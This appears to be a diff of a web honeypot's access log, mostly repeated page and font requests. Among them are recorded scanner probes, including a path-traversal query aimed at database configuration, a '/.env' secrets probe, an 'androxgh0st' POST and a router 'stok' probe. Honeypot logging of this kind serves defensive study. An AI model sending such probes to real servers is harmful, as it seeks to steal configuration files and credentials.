+2025-06-30 09:33:28 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:28 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:28 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:33:28 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:28 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:28 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:33:28 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:28 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:28 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:33:28 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:28 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:28 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:33:28 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:28 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:28 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:33:28 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:28 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:28 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:33:28 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:28 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:28 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:33:28 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:28 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:28 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:33:28 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:28 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:28 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:33:28 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:28 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:28 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:33:28 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:28 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:29 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:33:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:29 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:29 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:33:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:29 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:29 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:33:29 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:29 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:34:06 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:34:07 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:06 +0000] "GET /lighting.html HTTP/1.1" 200 4919 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:07 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:34:07 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:07 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 0 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:07 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:34:07 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:07 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:07 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:34:07 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:07 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:11 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:34:11 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:11 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:11 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:34:11 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:11 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:11 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:34:11 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:11 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:11 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-30 09:34:11 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:11 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:11 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-30 09:34:11 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:11 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:15 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:34:15 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:15 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:15 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-30 09:34:15 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:34:15 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-30 09:34:15 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:15 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:15 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:15 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:15 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:15 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:16 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:34:16 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:16 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:16 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:34:16 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:16 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:16 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-30 09:34:16 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:16 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:16 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-30 09:34:16 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:16 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:18 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:34:18 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:18 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:18 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:34:18 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:18 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:19 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-30 09:34:19 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:19 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:19 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-30 09:34:19 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:19 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:24 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:34:24 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:24 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:24 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:34:24 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:24 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:24 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-30 09:34:24 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:24 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:24 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-30 09:34:24 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:24 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:33 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:34:33 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:33 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:33 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:34:33 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:33 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:33 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-30 09:34:33 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:33 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:33 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-30 09:34:33 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:33 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:33 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:34:33 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:33 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:33 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:34:33 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:33 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:34 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-30 09:34:34 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:34 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:34 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-30 09:34:34 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:34 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:37 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:34:37 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:37 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:37 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:34:37 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:37 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:37 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-30 09:34:37 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:37 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:34:37 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-30 09:34:37 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:34:37 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:37:12 INFO:snare.server:handle_request: Request path: /locales/locale.json?locale=../../config/&namespace=database
+2025-06-30 09:37:12 INFO:aiohttp.access:log: 217.119.143.109 [30/Jun/2025:09:37:12 +0000] "GET /locales/locale.json?locale=../../config/&namespace=database HTTP/1.1" 404 433 "-" "Go-http-client"
+2025-06-30 09:45:26 INFO:snare.server:handle_request: Request path: /cgi-bin/luci/;stok=/locale
+2025-06-30 09:45:26 INFO:aiohttp.access:log: 64.130.33.147 [30/Jun/2025:09:45:26 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 433 "-" "-"
+2025-06-30 09:46:29 INFO:snare.server:handle_request: Request path: /
+2025-06-30 09:46:29 INFO:aiohttp.access:log: 178.255.149.135 [30/Jun/2025:09:46:29 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+2025-06-30 09:47:43 INFO:snare.server:handle_request: Request path: /.env
+2025-06-30 09:47:43 INFO:aiohttp.access:log: 78.153.140.149 [30/Jun/2025:09:47:43 +0000] "GET /.env HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+2025-06-30 09:47:43 INFO:snare.server:handle_request: Request path: /
+2025-06-30 09:47:43 INFO:snare.server:handle_request: POST data:
+2025-06-30 09:47:43 INFO:snare.server:handle_request: 	- 0x[]: androxgh0st
+2025-06-30 09:47:43 INFO:aiohttp.access:log: 78.153.140.149 [30/Jun/2025:09:47:43 +0000] "POST / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+2025-06-30 09:51:22 INFO:snare.server:handle_request: Request path: /
+2025-06-30 09:51:22 INFO:aiohttp.access:log: 74.82.47.4 [30/Jun/2025:09:51:22 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/98.0"
+2025-06-30 09:52:58 INFO:aiohttp.access:log: 35.222.151.27 [30/Jun/2025:09:52:58 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-30 09:53:00 INFO:snare.server:handle_request: Request path: /
+2025-06-30 09:53:00 INFO:aiohttp.access:log: 35.222.151.27 [30/Jun/2025:09:53:00 +0000] "OPTIONS / HTTP/1.0" 200 2033 "-" "-"
+2025-06-30 09:55:15 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-30 09:55:15 INFO:aiohttp.access:log: 74.82.47.4 [30/Jun/2025:09:55:15 +0000] "GET /favicon.ico HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0"
+2025-06-30 09:56:05 INFO:snare.server:handle_request: Request path: /geoserver/web/
+2025-06-30 09:56:05 INFO:aiohttp.access:log: 74.82.47.4 [30/Jun/2025:09:56:05 +0000] "GET /geoserver/web/ HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/98.0"
+2025-06-30 10:12:49 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:12:49 INFO:aiohttp.access:log: 204.76.203.206 [30/Jun/2025:10:12:49 +0000] "GET / HTTP/1.1" 200 2033 "-" "-"
+2025-06-30 10:32:50 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:32:50 INFO:aiohttp.access:log: 185.218.84.178 [30/Jun/2025:10:32:50 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-30 10:33:34 INFO:snare.server:handle_request: Request path: /logon.htm
+2025-06-30 10:33:34 INFO:aiohttp.access:log: 89.42.231.140 [30/Jun/2025:10:33:34 +0000] "GET /logon.htm HTTP/1.1" 404 433 "-" "Hello World"
+2025-06-30 10:35:16 INFO:snare.server:handle_request: Request path: /_profiler/phpinfo
+2025-06-30 10:35:16 INFO:aiohttp.access:log: 196.251.70.87 [30/Jun/2025:10:35:16 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 452 "-" "Mozilla/5.0 (Linux; Android 5.1.1; Coolpad 3622A Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
+2025-06-30 10:40:12 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:40:12 INFO:aiohttp.access:log: 185.242.226.115 [30/Jun/2025:10:40:12 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
+2025-06-30 10:41:07 INFO:aiohttp.access:log: 185.242.226.115 [30/Jun/2025:10:41:07 +0000] "UNKNOWN / HTTP/1.0" 400 217 "-" "-"
+2025-06-30 10:45:05 INFO:snare.server:handle_request: Request path: /
+2025-06-30 10:45:05 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:10:45:05 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-30 10:46:17 INFO:snare.server:handle_request: Request path: /
